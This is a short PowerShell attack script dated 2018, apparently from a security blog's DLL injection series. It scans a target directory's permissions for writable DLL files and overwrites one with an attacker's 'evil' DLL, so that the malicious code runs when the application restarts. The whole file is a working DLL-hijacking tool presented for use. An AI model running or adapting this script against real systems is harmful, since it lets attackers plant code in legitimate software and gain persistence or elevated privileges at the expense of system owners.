# -------------------------------------------------------------------------------
# 
# wh0care.ps1 -- small Powershell script to automate our 'simple DLL injections'
# 
# refs: https://code610.blogspot.com/2018/09/dll-injection-part-1.html
#       https://code610.blogspot.com/2018/08/venomesh-simple-msfvenom-generator.html
#  
# 09.09.2018
# 
# -------------------------------------------------------------------------------

# defines:
param([string]$targetDir) # to set argv[1] as our 'targetDir'
$evilDll="c:\\Pliki\\h00ker.dll"
$logMeHere="C:\\Pliki\\oko1.log"

# Get perms recursively from target path and save it to log1.file:
#
Write-Host "[+] Checking perms for target dir: " $targetDir
Get-ChildItem -Recurse $targetDir | Get-Acl > $logMeHere
Write-Host "[+] Done. Checking files..."

# grep "Modif" for our log1.file;
# save the output to $tmpvar;
# grep it again to get splitted filename.dll:
#
$tmpvar=(Get-Content $logMeHere ) | Select-String -Pattern ".dll" | Select-String -Pattern "Modif"
$trydll=($tmpvar -Split(" ") | select-string -pattern ".dll")
Write-Host "[+] Got filename:" $trydll


# now we can replace targetDll with our super evil.dll 
#
Write-Host "[+] ...but trying evil 0ne: " $evilDll
#
# Rename 
Write-Host "[+] Here we go: " $targetDir\$trydll
Copy-Item $evilDll -Destination $targetDir\$trydll

write-host "[+] Dest app should be ready to restart. Check it!"

# eof
# o/

